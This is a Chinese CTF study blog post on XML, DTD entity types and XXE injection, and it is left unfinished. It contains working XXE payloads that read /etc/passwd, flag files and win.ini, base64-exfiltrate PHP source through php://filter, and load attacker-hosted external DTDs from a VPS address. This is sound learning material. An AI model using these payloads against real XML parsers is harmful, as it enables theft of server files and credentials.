---
title: XXE
description: xxe笔记
tags:
  - CTF
  - WEB
categories:
  - 笔记
cover: 'https://tuchuang.voooe.cn/images/2024/05/15/_20240515102411.jpg'
abbrlink: xxe[6]
date: 2024-05-15 10:17:00
---

## 认识XML
### 定义
XML即 可扩展标记语言（EXtensible Markup Language），是一种标记语言，其标签没有预定义，您需要自行定义标签，是W3C的推荐标准。
### 与HTML的区别
HTML 被设计用来显示数据
XML 被设计用来传输和存储数据
### 基本格式
```XML
<!--XML声明-->
<?xml version="1.0" encoding="UTF-8"?>

<!--DTD，这部分可选的-->          
<!DOCTYPE foo [ 
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >
]>

<!--文档元素-->                                                                          
<foo>&xxe;</foo>

```
### DTD
DTD：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。
1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。
2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。
#### 内部实体
```XML
<!DOCTYPE note [
    <!ENTITY a "admin">
]>
<note>&a</note>
<!-- admin -->#admin

#<!ENTITY 实体名称 "实体的值">
```
#### 外部实体
```XML
<!DOCTYPE note> [
    <!ENTITY c SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php">
]>
<note>&c</note>
<!-- ZmxhZ3t0ZXN0fQ== -->#flag{test}

#<!ENTITY 实体名称 SYSTEM "URI">
```
#### 参数实体
```XML
<!DOCTYPE note> [
    <!ENTITY % b "<!ENTITY b1 "awsl">">
    %b;
]>
<note>&b1</note>
<!-- awsl -->#awsl

#<!ENTITY % 实体名称 "实体的值">
#<!ENTITY % 实体名称 SYSTEM "URI">

```
参数实体用% name声明，引用时用%name;，只能在DTD中声明，DTD中引用。
其余实体直接用name声明，引用时用&name;，只能在DTD中声明，可在xml文档中引用
#### 外部参数实体
```XML
<!DOCTYPE note> [
    <!ENTITY % d SYSTEM "http://47.106.143.26/xml.dtd">
    %d;
]>
<note>&d1</note>
#<!-- http://47.106.143.26/xml.dtd -->

<!ENTITY d1 SYSTEM "data://text/plain;base64,Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA==">
#<!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== -->
#<?xml version="1.0" encoding="utf-8"?><!DOCTYPE a [    <!ENTITY % name SYSTEM "file:///etc/passwd">    %name;]>

```

## 认识XXE
### 定义
1. XXE(XML External Entity Injection)全称为XML外部实体注入，由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。例如PHP中的simplexml_load默认情况下会解析外部实体，有XXE漏洞的标志性函数为simplexml_load_string()。
2. 一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为Blind XXE，可以使用外带数据通道提取数据。

### 有回显
#### 利用外部实体
```XML
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [ 
<!ENTITY rabbit SYSTEM "file:///flag" >
]>
<user><username>&rabbit;</username><password>123</password></user>
```
#### 利用外部参数实体
```XML
<?xml version="1.0" ?>
<!DOCTYPE test [
    <!ENTITY % file SYSTEM "http://vps-ip/hack.dtd">
    %file;
]>
<test>&hhh;</test>
```
```XML
<!ENTITY hhh SYSTEM 'file:///etc/passwd'>
```
### 无回显


## 未完待续



















参考：
[XXE知识总结，有这篇就够了！](https://blog.csdn.net/weixin_44420143/article/details/118721145)
[CTF XXE](https://www.cnblogs.com/20175211lyz/p/11413335.html)